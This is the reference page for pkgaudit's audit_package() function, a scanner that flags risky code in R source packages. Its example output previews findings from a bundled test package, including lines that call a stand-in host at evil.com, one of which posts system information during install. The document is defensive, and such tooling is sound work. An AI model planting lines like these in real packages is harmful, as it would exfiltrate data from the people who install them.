# Audit an R source package

Finds security-relevant file and code contexts, code patterns, and shell
and make matches for review before an R source package is trusted.

## Usage

``` r
audit_package(path = ".", rules = load_rules(), .origin = NULL)
```

## Arguments

- path:

  Path to an R source package root directory. Defaults to the current
  directory.

- rules:

  Named list of rules. Defaults to the rules bundled with the package as
  returned by
  [`load_rules()`](https://tylerjssmith.github.io/pkgaudit/reference/load_rules.md).

- .origin:

  Internal. Used by
  [`audit_tarball()`](https://tylerjssmith.github.io/pkgaudit/reference/audit_tarball.md)
  to record tarball provenance: a list of `path` and `sha256`, each a
  length-one character, and `is_tarball`, a length-one logical that is
  not `NA`. A malformed one is refused before the scan rather than
  silently recorded. `NULL` for a directory scan, which is hashed with
  [`hash_manifest()`](https://tylerjssmith.github.io/pkgaudit/reference/hash_manifest.md)
  instead.

## Value

A
[`new_pkgaudit()`](https://tylerjssmith.github.io/pkgaudit/reference/new_pkgaudit.md)
object: a named list with class `pkgaudit` holding five data frames and
a `metadata` list. Every findings frame carries the nine phase columns
described in Details and joins to the others on `file_context`. Paths
are relative to the package root.

- file_contexts:

  `rule`, `file_context`, `message`.

- patterns:

  `rule`, `file_context`, `line_number`, `column_number`,
  `code_context`, `guarded`, `indirect`, `preview`, `message`, `attck`.
  `code_context` is where the code sits within its file: `top_level`,
  `in_function`, an enclosing lifecycle hook, or the part of a help file
  it came from.

- matches:

  `rule`, `file_context`, `line_number`, `column_number`, `preview`,
  `message`, `attck`: regular-expression matches in the shell and
  Make-like file contexts.

- coverage:

  `file_context`, `language`, `status`, `reason`, `first_line`,
  `last_line`, `lines`, `bytes`, `rule`. One row per file the package
  carries that is, or could be, code, plus one per span of an unanalyzed
  language inside a literate file – a `python` chunk in a vignette is
  its own row. `status` is `parsed`, `matched`, `exportable`,
  `unexamined` or `error`; `reason` says what stood in the way, and is
  `NA`, `no_analyzer`, `no_extractor`, `no_rule`, `serialized`,
  `binary`, `symlink`, `too_large`, `unreadable` or `unparseable`.

- errors:

  `step`, `file_context`, `rule`, `message`. Recoverable failures,
  collected rather than aborting the scan.

- metadata:

  `pkg_name`, `pkg_version`, `pkg_path`, `pkg_is_tarball`, `pkg_sha256`,
  `pkgaudit_version`, `pkgaudit_rules_version`, `pkgaudit_rules_sha256`,
  `scanned`. The two rules fields are `NA` for a rules list that did not
  come from
  [`load_rules()`](https://tylerjssmith.github.io/pkgaudit/reference/load_rules.md).

## Details

Every findings frame carries one logical column per phase –
`at_autoconf`, `at_build`, `at_check`, `at_install_src`,
`at_install_bin`, `at_load`, `at_attach`, `at_unload` and `at_detach`.
Value is `TRUE` when that finding's code runs then. A finding can belong
to several phases.

A file in a language pkgaudit cannot read is left unscanned rather than
scanned badly, so a file's absence from `patterns` and `matches` is not
evidence that it is clean; see `coverage` and `errors`.

`preview` is a display-only excerpt of the line, whitespace collapsed
and a long line windowed on the match, so `column_number` does not index
into it.

## See also

[`vignette("pkgaudit")`](https://tylerjssmith.github.io/pkgaudit/articles/pkgaudit.md)
for a worked scan, and
[`vignette("rules")`](https://tylerjssmith.github.io/pkgaudit/articles/rules.md)
for the rules, phases and contexts behind a finding.

## Examples

``` r
# untrustedpkg is a small package shipped with pkgaudit to be scanned.
tarball <- system.file(
  "extdata", "untrustedpkg", "untrustedpkg_0.1.0.tar.gz",
  package = "pkgaudit"
)
exdir <- file.path(tempdir(), "untrustedpkg-example")
utils::untar(tarball, exdir = exdir)

rules  <- load_rules()
result <- audit_package(file.path(exdir, "untrustedpkg"), rules = rules)
result$file_contexts
#>        rule file_context
#> 3 configure    configure
#>                                                                                                                                                                                                                                                  message
#> 3 configure is a shell script used for system-dependent configuration when a package is installed from source, including the installs performed by R CMD check and by R CMD build when a package has vignettes. It can execute arbitrary shell commands.
#>   at_autoconf at_build at_check at_install_src at_install_bin at_load at_attach
#> 3       FALSE     TRUE     TRUE           TRUE          FALSE   FALSE     FALSE
#>   at_unload at_detach
#> 3     FALSE     FALSE
result$patterns
#>            rule      file_context line_number column_number     code_context
#> 1 download_file         R/fetch.R           2             3      in_function
#> 2        system           R/zzz.R           2             3      onLoad_base
#> 3 download_file man/fetch_data.Rd          11             1      Rd_examples
#> 4          httr man/fetch_data.Rd           6            30 Rd_Sexpr_install
#>   guarded indirect
#> 1   FALSE    FALSE
#> 2   FALSE    FALSE
#> 3   FALSE    FALSE
#> 4   FALSE    FALSE
#>                                                                       preview
#> 1                                              download.file(url, tempfile())
#> 2                                                          system("uname -a")
#> 3                  download.file("https://www.evil.com/data.csv", tempfile())
#> 4 httr::POST("https://www.evil.com/collect", body = list(info = Sys.info()...
#>                                                                                                                                                                message
#> 1 download.file() and url() retrieve or open a connection to a remote resource. This can stage a payload for execution via source() or system() in a two-stage attack.
#> 2                                                                              system(), system2(), shell() (on Windows), and pipe() execute arbitrary shell commands.
#> 3 download.file() and url() retrieve or open a connection to a remote resource. This can stage a payload for execution via source() or system() in a two-stage attack.
#> 4                            An httr HTTP call sends an outbound request. A request may be used to exfiltrate credentials or other data, or to fetch a remote payload.
#>                 attck at_autoconf at_build at_check at_install_src
#> 1               T1105       FALSE    FALSE    FALSE          FALSE
#> 2 T1059.003 T1059.004       FALSE     TRUE     TRUE           TRUE
#> 3               T1105       FALSE    FALSE     TRUE          FALSE
#> 4               T1041       FALSE     TRUE     TRUE           TRUE
#>   at_install_bin at_load at_attach at_unload at_detach
#> 1          FALSE   FALSE     FALSE     FALSE     FALSE
#> 2          FALSE    TRUE     FALSE     FALSE     FALSE
#> 3          FALSE   FALSE     FALSE     FALSE     FALSE
#> 4          FALSE   FALSE     FALSE     FALSE     FALSE
print(result)
#> --- pkgaudit ----------------------------------------------------------------
#> Package:   untrustedpkg v0.1.0 (source directory)
#> Path:      /tmp/Rtmp0kUaSd/untrustedpkg-example/untrustedpkg
#> SHA-256:   50be0a4fe9997cb47764c1eb2026be864242314a4af6dfd634e60a358dec8171
#> Scanned:   2026-08-24 18:36 UTC with pkgaudit v0.4.0, rules v0.4.0
#> 
#> File contexts:  1
#> Patterns:       4
#> Matches:        1
#> Errors:         0
```
